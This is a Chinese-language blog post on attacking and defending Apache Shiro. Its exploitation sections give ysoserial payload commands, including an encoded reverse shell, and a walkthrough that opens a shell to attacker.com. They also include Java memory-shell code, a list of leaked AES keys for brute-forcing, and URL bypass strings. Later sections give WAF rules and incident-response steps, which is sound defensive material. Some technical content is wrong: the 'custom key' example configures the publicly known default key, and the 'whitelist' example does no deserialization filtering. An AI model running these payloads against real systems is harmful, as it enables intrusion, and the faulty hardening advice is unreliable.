---
title: Apache Shiro安全配置与漏洞利用
date: 2026-02-16
categories: 
  - Java安全
  - Web安全
tags: 
  - Apache Shiro
  - Java
  - 反序列化
  - 安全加固
  - 渗透测试
  - 代码审计
---

# Apache Shiro安全配置与漏洞利用

Apache Shiro是一个功能强大且易于使用的Java安全框架，提供了认证、授权、加密和会话管理功能。然而，由于其设计缺陷和配置不当，Shiro成为了Java Web应用中最常见的攻击入口之一。本文将从攻击者视角全面梳理Shiro的各个攻击面，并给出对应的防御方案。

---

## 一、Apache Shiro基础

### 1.1 什么是Apache Shiro

Apache Shiro是一个轻量级的Java安全框架，主要功能包括：
- **Authentication（认证）**：验证用户身份，即登录
- **Authorization（授权）**：访问控制，判断用户是否有权限执行某操作
- **Session Management（会话管理）**：管理用户会话，即使在非Web环境下
- **Cryptography（加密）**：使用加密算法保护数据安全

### 1.2 Shiro核心组件

```
Subject（主体）
    ↓
SecurityManager（安全管理器）
    ↓
Realm（领域）
    ↓
数据源（数据库、LDAP等）
```

**核心概念**：
- **Subject**：当前操作用户，可以是人也可以是第三方服务
- **SecurityManager**：安全管理器，Shiro的核心，管理所有Subject
- **Realm**：域，Shiro从Realm获取安全数据（用户、角色、权限）
- **Session**：会话，Shiro提供的会话管理
- **Cryptography**：加密组件，用于加密和解密

### 1.3 Shiro的RememberMe机制

Shiro的RememberMe功能允许用户在关闭浏览器后仍然保持登录状态。其工作流程：

1. 用户登录时勾选"记住我"
2. Shiro将用户信息序列化
3. 使用AES加密序列化数据
4. Base64编码后存储在Cookie中（rememberMe字段）
5. 下次访问时，Shiro读取Cookie
6. Base64解码 → AES解密 → 反序列化 → 恢复用户信息

**这个机制是Shiro最大的安全隐患所在。**

---

## 二、Shiro反序列化漏洞

### 2.1 Shiro-550（CVE-2016-4437）

这是Shiro历史上最严重的漏洞，影响范围极广。

**漏洞原理**：
Shiro 1.2.4及之前版本使用硬编码的AES密钥加密RememberMe Cookie。攻击者可以：
1. 使用已知密钥构造恶意序列化对象
2. AES加密后Base64编码
3. 发送恶意Cookie
4. 服务端解密并反序列化，触发RCE

**硬编码密钥**：
```java
// org.apache.shiro.mgt.AbstractRememberMeManager
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(
    "kPH+bIxk5D2deZiIxcaaaA=="
);
```

**受影响版本**：
- Apache Shiro < 1.2.5

**漏洞利用**：

利用工具：`shiro_tool.jar` 或 `ShiroExploit`

```bash
# 使用 ShiroExploit 进行漏洞检测
java -jar ShiroExploit.jar -t http://target.com/login

# 验证密钥是否存在
python3 shiro_exploit.py -u http://target.com/login -k "kPH+bIxk5D2deZiIxcaaaA=="
```

**利用链选择**：

| 利用链 | 依赖要求 | 适用场景 | 成功率 |
|--------|----------|----------|--------|
| CommonsBeanutils1 | 无特殊依赖 | 通用 | ★★★★★ |
| CommonsCollections2/3/4 | commons-collections | 存在依赖时 | ★★★★☆ |
| Spring1/Spring2 | Spring框架 | Spring项目 | ★★★☆☆ |
| Jdk7u21 | JDK < 7u21 | 老版本JDK | ★★★☆☆ |

**CommonsBeanutils1 为什么不需要依赖？**

```java
// Shiro 本身依赖了 commons-beanutils
// org.apache.shiro:shiro-core -> commons-beanutils:commons-beanutils

// 利用链原理：
// PriorityQueue.readObject() 
//   -> TransformingComparator.compare()
//     -> BeanComparator.compare()
//       -> PropertyUtils.getProperty()
//         -> TemplatesImpl.getOutputProperties()
//           -> 加载恶意字节码
```

**ysoserial 生成 Payload**：

```bash
# 基础用法
java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/pwned" > payload.bin

# 结合 JRMP 监听器
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 "calc.exe"

# 生成 base64 编码的 payload
java -jar ysoserial.jar CommonsBeanutils1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|{base64,-d}|{bash,-i}" | base64
```

**依赖检测方法**：

```bash
# 1. 检查 lib 目录
ls WEB-INF/lib/ | grep -E "commons-collections|spring"

# 2. 错误回显判断
# 发送 payload 后，如果返回 500 且包含 ClassNotFoundException
# 说明缺少对应依赖

# 3. 使用 dnslog 探测
# 分别尝试不同利用链，看哪个能触发 DNS 请求
```

### 2.2 Shiro-721（CVE-2019-12422）

**漏洞原理**：
Shiro 1.2.5-1.4.1 版本使用 AES-128-CBC 加密，密钥虽然不再硬编码，但使用了 **Padding Oracle Attack**（填充预言攻击）可以逆向破解密钥。

**攻击条件**：
1. 需要任意一个有效的 rememberMe Cookie
2. 服务端使用 CBC 模式加密
3. 可以观察到不同的错误响应（解密失败 vs 反序列化失败）

**利用过程**：
```python
# 使用 rememberMe 字段进行 Padding Oracle 攻击
# 逐步修改密文，观察响应差异
# 最终解密出 AES 密钥
```

**受影响版本**：
- Apache Shiro 1.2.5 - 1.4.1

### 2.3 Shiro-778（CVE-2021-41303）

**漏洞原理**：
Shiro 1.7.0 版本之前的 `RegExPatternMatcher` 存在缺陷，攻击者可以通过构造包含控制字符的路径绕过权限检查。

**绕过方式**：
```
/admin/user → 需要认证
/admin/user%0a → 绕过认证（%0a 是换行符）
/admin/user%0d → 绕过认证（%0d 是回车符）
```

**根本原因**：
正则表达式匹配时未对控制字符做过滤，导致匹配失败但实际访问成功。

**受影响版本**：
- Apache Shiro < 1.7.1

---

### 2.4 其他高危漏洞

#### CVE-2022-40664 - 认证绕过

**漏洞原理**：
Shiro 1.10.0 之前的版本，当使用 `RegexRequestMatcher` 时，可能导致身份验证绕过。

**影响**：
- Apache Shiro < 1.10.0

**修复方案**：
升级到 1.10.0 或以上版本。

### 2.5 Shiro权限绕过漏洞

#### 2.5.1 CVE-2020-11989

**漏洞原理**：
Shiro 与 Spring 集成时，URL 解析差异导致权限绕过。

**绕过方式**：
```
正常访问：/admin/user → 需要认证
绕过路径：/admin/user/ → 绕过认证
          /admin/user/. → 绕过认证
```

**根本原因**：
- Shiro：`PathMatchingFilter` 使用 `endsWith` 匹配
- Spring：`@RequestMapping` 会规范化路径

#### 2.3.2 CVE-2020-13933

**漏洞原理**：
编码问题导致的权限绕过。

**绕过方式**：
```
/admin/user  → 需要认证
/admin/%3buser → 绕过认证（;编码为%3b）
/admin/%2euser → 绕过认证（.编码为%2e）
```

#### 2.3.3 CVE-2020-17510

**漏洞原理**：
Shiro 1.5.0-1.5.3 在处理 URL 路径时的缺陷。

**绕过方式**：
```
/admin/user → 需要认证
/admin/user/..;/index → 绕过认证
```

**完整利用流程示例**：

**场景**：某系统使用 Shiro 1.2.4，发现 rememberMe=deleteMe

```bash
# Step 1: 确认存在 Shiro
➜ curl -s -o /dev/null -w "%{http_code}" http://target.com/login -H "Cookie: rememberMe=test"
200
# 查看响应头包含 rememberMe=deleteMe，确认存在 Shiro

# Step 2: 使用工具检测密钥
➜ python3 shiro.py -u http://target.com/login
[+] 正在检测密钥...
[+] 发现密钥: kPH+bIxk5D2deZiIxcaaaA==

# Step 3: 尝试执行命令
➜ python3 shiro.py -u http://target.com/login -k "kPH+bIxk5D2deZiIxcaaaA==" -c "whoami"
[+] 目标系统: Linux
[+] 命令执行成功: www-data

# Step 4: 获取 Shell
# 本地监听
➜ nc -lvvp 4444

# 发送反弹 shell payload
➜ python3 shiro.py -u http://target.com/login -k "kPH+bIxk5D2deZiIxcaaaA==" \
  -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"

# Step 5: 注入内存马（可选）
# 通过反序列化注入 Filter 型内存马
# 访问: http://target.com/?cmd=whoami
```

---

## 三、Shiro漏洞实战利用

### 3.1 信息收集

**识别 Shiro 应用**：

1. **Cookie 特征**：
   ```http
   Set-Cookie: rememberMe=deleteMe
   ```

2. **响应头特征**：
   ```http
   X-Powered-By: Shiro
   ```

3. **URL 特征**：
   - `/login`
   - `/logout`
   - `/unauthorized`

**检测脚本**：
```python
import requests

def detect_shiro(url):
    headers = {
        'Cookie': 'rememberMe=test'
    }
    resp = requests.get(url, headers=headers, allow_redirects=False)
    
    if 'rememberMe=deleteMe' in str(resp.headers):
        print(f"[+] {url} 可能存在 Shiro 漏洞")
        return True
    return False
```

### 3.2 密钥爆破

**常见密钥列表**：

**Shiro 官方默认密钥（1.2.4及之前）**：
```
kPH+bIxk5D2deZiIxcaaaA==
```

**网上公开的常见密钥（收集自GitHub、漏洞复现文章）**：
```
wGiHplamyXlVB11UXWol8g==
4AvVhmFLUs0KTA3Kprsdag==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
Z3VucwAAAAAAAAAAAAAAAA==
ZUdsaGJuSmxibVI2ZHc9PQ==
U3ByaW5nQmxhZGUAAAAAAA==
MWJjNmQ3MjEzMzZjODM2NQ==
ZGVmYXVsdF9jaXBoZXJrZXk=
2itfHvFqDZF7Htc1vT1wcQ==
QJpM8T7rSZAGXvF0QwKoQA==
```

**密钥收集工具**：
```bash
# 使用 fofa 语法搜索 Shiro 应用
title="Shiro" && body="rememberMe"

# 使用 nuclei 批量检测
nuclei -l urls.txt -t shiro-detection.yaml

# 使用 xray 主动扫描
xray webscan --plugins shiro --url http://target.com
```

**爆破脚本**：
```python
import base64
import requests
from Crypto.Cipher import AES

def check_key(url, key):
    # 构造序列化 payload（简单的 DNSLog）
    payload = b'\xac\xed...'  # ysoserial 生成的 payload
    
    # AES 加密
    cipher = AES.new(base64.b64decode(key), AES.MODE_CBC, iv=b'1234567890123456')
    encrypted = cipher.encrypt(payload)
    
    # 发送请求
    cookie = base64.b64encode(encrypted).decode()
    resp = requests.get(url, cookies={'rememberMe': cookie})
    
    # 根据响应判断
    if 'deleteMe' not in resp.headers.get('Set-Cookie', ''):
        return True
    return False
```

### 3.3 回显与内存马

**命令回显方法**：

1. **Tomcat 回显**：利用 Tomcat 全局存储 Response 对象
2. **Spring 回显**：利用 RequestContextHolder 获取当前请求
3. **字节码修改**：修改关键类的 toString 方法

**内存马注入**：
```java
// Filter 型内存马
Filter filter = new Filter() {
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            Runtime.getRuntime().exec(cmd);
        }
        chain.doFilter(req, resp);
    }
};
// 注册到 FilterChain
```

---

## 四、防御方案

### 4.1 升级版本

**推荐版本**：
- Apache Shiro >= 1.7.1（修复已知所有绕过漏洞）
- Apache Shiro >= 1.5.3（修复 Padding Oracle）
- Apache Shiro >= 1.2.5（修复默认密钥）

**Maven 依赖升级**：
```xml
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
    <version>1.12.0</version>
</dependency>
```

### 4.2 密钥安全

**生成随机密钥**：
```java
// 生成 128/256 位随机密钥
byte[] keyBytes = new byte[16]; // 128位
new SecureRandom().nextBytes(keyBytes);
String base64Key = Base64.encodeToString(keyBytes);
System.out.println("AES Key: " + base64Key);
```

**配置密钥**：
```ini
# shiro.ini
[main]
# 使用自定义密钥
rememberMeManager.cipherKey = kPH+bIxk5D2deZiIxcaaaA==

# 或者使用 KeyGenerator
credentialsMatcher.hashIterations = 1024
credentialsMatcher.hashAlgorithmName = SHA-256
```

### 4.3 关闭 RememberMe

如果不需要记住我功能，建议关闭：
```java
@Bean
public SecurityManager securityManager() {
    DefaultWebSecurityManager securityManager = new DefaultWebSecurityManager();
    // 禁用 RememberMe
    securityManager.setRememberMeManager(null);
    return securityManager;
}
```

### 4.4 反序列化防护

**使用白名单**：
```java
// 配置反序列化过滤器
@Bean
public ShiroFilterFactoryBean shiroFilterFactoryBean() {
    ShiroFilterFactoryBean filter = new ShiroFilterFactoryBean();
    
    // 配置安全过滤器
    Map<String, String> filterMap = new HashMap<>();
    filterMap.put("/**", "authc");  // 全部需要认证
    filter.setFilterChainDefinitionMap(filterMap);
    
    return filter;
}
```

**RASP 防护**：
```java
// 在 JVM 层面拦截反序列化
Instrumentation instrumentation = ...;
instrumentation.addTransformer(new ClassFileTransformer() {
    @Override
    public byte[] transform(...) {
        // 拦截 ObjectInputStream
        // 检查反序列化类是否在白名单
    }
});
```

### 4.5 URL 规范化

**统一使用 Spring 的 AntPathMatcher**：
```java
@Bean
public ShiroFilterFactoryBean shiroFilterFactoryBean() {
    ShiroFilterFactoryBean filter = new ShiroFilterFactoryBean();
    
    // 使用 Spring 的路径匹配器
    PathMatchingFilterChainResolver resolver = new PathMatchingFilterChainResolver();
    resolver.setPathMatcher(new AntPathMatcher());
    
    return filter;
}
```

**严格 URL 配置**：
```ini
# 不要使用通配符配置敏感路径
/admin/** = authc, roles[admin]

# 应该明确配置
/admin/user = authc, roles[admin]
/admin/config = authc, roles[admin]
```

### 4.6 WAF 防护规则

**ModSecurity 规则示例**：
```apache
# 检测 Shiro 反序列化攻击
SecRule REQUEST_HEADERS:Cookie "@contains rememberMe=" \
    "id:1001,phase:1,deny,status:403,msg:'Shiro Deserialization Attack Detected'"

# 检测非法 rememberMe Cookie 长度
SecRule REQUEST_HEADERS:Cookie "@rx rememberMe=[A-Za-z0-9+/]{1000,}" \
    "id:1002,phase:1,deny,status:403,msg:'Suspicious Shiro Cookie Length'"

# 检测路径遍历绕过
SecRule REQUEST_URI "@rx /(\\x2e|%2e|%252e)" \
    "id:1003,phase:1,deny,status:403,msg:'Path Traversal Detected'"
```

**Nginx Lua 防护**：
```lua
-- 检测 rememberMe Cookie
if ngx.var.http_cookie then
    local rememberMe = ngx.var.http_cookie:match("rememberMe=([^;]+)")
    if rememberMe and #rememberMe > 500 then
        -- 记录日志并拦截
        ngx.log(ngx.ERR, "Shiro attack detected from " .. ngx.var.remote_addr)
        ngx.exit(403)
    end
end
```

### 4.7 日志监控与告警

**需要监控的关键日志**：

```java
// 记录所有 rememberMe 反序列化尝试
log.warn("RememberMe cookie deserialization attempted from IP: {}", 
         request.getRemoteAddr());

// 记录失败的 URL 访问
log.warn("Unauthorized access attempt to: {} from IP: {}", 
         request.getRequestURI(), request.getRemoteAddr());
```

**ELK 告警规则**：
```json
{
  "query": {
    "bool": {
      "must": [
        { "match": { "message": "rememberMe" }},
        { "range": { "@timestamp": { "gte": "now-5m" }}}
      ]
    }
  }
}
```

**Splunk 搜索**：
```splunk
# 统计 rememberMe 异常请求
index=web source=*access.log* "rememberMe" 
| stats count by clientip, uri 
| where count > 10 
| table clientip, uri, count
```

---

## 五、代码审计检查点

### 5.1 检查清单

```
□ Shiro 版本是否 >= 1.7.1
□ rememberMe 是否配置了随机密钥
□ 是否存在硬编码密钥
□ URL 配置是否严格
□ 是否禁用了不必要的功能
□ 反序列化是否有白名单限制
```

### 5.2 审计工具

**Maven 依赖检查**：
```bash
# 检查 Shiro 版本
mvn dependency:tree | grep shiro

# 使用 OWASP 检查漏洞
mvn org.owasp:dependency-check-maven:check
```

**源代码审计**：
```bash
# 搜索硬编码密钥
grep -r "cipherKey" --include="*.java" --include="*.ini" --include="*.xml"

# 搜索 rememberMe 配置
grep -r "rememberMe" --include="*.java" --include="*.ini"

# 搜索危险配置
grep -r "setRememberMeManager" --include="*.java"
grep -r "CookieRememberMeManager" --include="*.java"
```

**IDEA 插件推荐**：
- **SonarLint**：实时检测安全漏洞
- **OWASP Dependency-Check**：检查依赖漏洞
- **SpotBugs**：静态代码分析

---

## 六、应急响应

### 6.1 入侵检测

**检查是否已被攻击**：

```bash
# 1. 检查日志中是否有异常的 rememberMe
zgrep -i "rememberMe" /var/log/tomcat*/access_log* | tail -100

# 2. 检查是否包含可疑的 Base64 字符串（长度超过500）
awk -F'rememberMe=' '/rememberMe=/{print $2}' /var/log/tomcat*/access_log* | \
  awk -F';' '{print $1}' | awk 'length > 500'

# 3. 检查系统是否存在后门
find /tmp /var/tmp -name "*.sh" -o -name "*.jsp" -mtime -1 2>/dev/null

# 4. 检查网络连接
netstat -antp | grep ESTABLISHED
ss -antp | grep -v "127.0.0.1"

# 5. 检查定时任务
crontab -l
cat /etc/cron.d/*
ls -la /etc/cron.daily/
```

**Java 进程分析**：
```bash
# 查找可疑的类加载
jcmd <pid> VM.classloader_stats

# 导出堆内存分析
jmap -dump:format=b,file=/tmp/heap.hprof <pid>

# 使用 MAT 工具分析堆内存
# 查找 org.apache.shiro.mgt.RememberMeManager 实例
```

### 6.2 应急处置

**紧急止损措施**：

```bash
# 1. 立即下线应用（或切换到维护页面）
mv webapps/ROOT webapps/ROOT.bak
cp maintenance.html webapps/ROOT/

# 2. 阻断攻击者 IP
iptables -A INPUT -s <attacker_ip> -j DROP

# 3. 清理恶意文件
find / -name "*.jsp" -newer /var/www/ -exec ls -la {} \;
find /tmp -name "*shell*" -exec rm -f {} \;

# 4. 重启应用（清除内存马）
systemctl restart tomcat
```

**恢复步骤**：
1. 升级到最新版本 Shiro
2. 更换 AES 密钥
3. 清理所有恶意文件
4. 全量代码审计
5. 修改所有用户密码
6. 重新上线并加强监控

### 6.3 常用工具对比

| 工具名称 | 功能 | 适用场景 | 推荐指数 |
|----------|------|----------|----------|
| **ShiroExploit** | GUI 利用工具 | 快速检测与利用 | ★★★★★ |
| **ysoserial** | 生成序列化 Payload | 自定义利用链 | ★★★★★ |
| **shiro_attack** | Python 利用脚本 | 批量扫描 | ★★★★☆ |
| **marshalsec** | JRMP 利用 | 绕过某些限制 | ★★★☆☆ |
| **Burp插件** | 集成到 Burp | 渗透测试 | ★★★★☆ |
| **nuclei** | 批量漏洞扫描 | 资产普查 | ★★★★★ |

**工具下载地址**：
- ShiroExploit: https://github.com/feihong-cs/ShiroExploit
- shiro_attack: https://github.com/sv3nbeast/shiro_attack
- ysoserial: https://github.com/frohoff/ysoserial

---

## 七、总结

Apache Shiro 作为 Java 安全框架，虽然功能强大，但历史上多次出现严重安全漏洞。防护要点：

1. **及时升级**：保持使用最新版本（>= 1.12.0）
2. **密钥管理**：使用随机生成的强密钥（256位推荐）
3. **最小权限**：禁用不需要的功能（如 RememberMe）
4. **严格配置**：URL 权限配置要精确，避免绕过
5. **多层防御**：结合 RASP、WAF、日志监控
6. **应急响应**：建立完善的入侵检测和处置流程

**安全是持续的过程，而非一次性的配置。**

---

## 参考资源

### 官方文档
- [Apache Shiro 官方文档](https://shiro.apache.org/documentation.html)
- [Shiro Security Reports](https://shiro.apache.org/security-reports.html)

### CVE 详情
- [CVE-2016-4437](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437) - Shiro-550
- [CVE-2019-12422](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12422) - Shiro-721
- [CVE-2020-11989](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11989) - 权限绕过
- [CVE-2020-13933](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13933) - 权限绕过
- [CVE-2020-17510](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-17510) - 权限绕过
- [CVE-2021-41303](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41303) - Shiro-778
- [CVE-2022-40664](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40664) - 认证绕过

### 技术文章
- [Padding Oracle Attack 原理](https://en.wikipedia.org/wiki/Padding_oracle_attack)
- [Java 反序列化漏洞基础](https://security.tencent.com/index.php/blog/msg/136)
- [Shiro 漏洞原理与利用](https://paper.seebug.org/shiro)

### 工具下载
- [ShiroExploit](https://github.com/feihong-cs/ShiroExploit) - GUI 利用工具
- [shiro_attack](https://github.com/sv3nbeast/shiro_attack) - Python 利用脚本
- [ysoserial](https://github.com/frohoff/ysoserial) - Java 反序列化 Payload 生成
- [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates) - 扫描模板
- [Burp-Shiro](https://github.com/pmiaowu/BurpReflectiveXssMiao) - Burp 插件

---

**免责声明**：本文仅供安全研究和学习交流使用，请勿用于非法用途。使用本文内容造成的任何后果，作者不承担任何责任。